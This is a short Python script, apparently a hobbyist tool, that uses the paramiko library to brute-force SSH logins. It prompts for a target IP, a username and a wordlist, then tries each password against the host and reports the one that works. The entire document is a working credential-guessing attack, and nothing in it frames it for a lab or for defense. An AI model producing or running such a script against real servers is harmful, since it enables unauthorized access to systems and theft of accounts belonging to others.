import paramiko
host = input (" Enter target IP: ")
username = input("Enter username : ")
password_file = input ("Enter password file :")
with open(password_file, "r") as file :
    passwords = file.readlines()
for passwords in passwords:
    passwords = passwords.strip()
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=passwords)
        print(f"[SUCCESS] password found : {passwords}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print(f"[FAILED] {passwords}")
    except:
        print("connection error")
        break 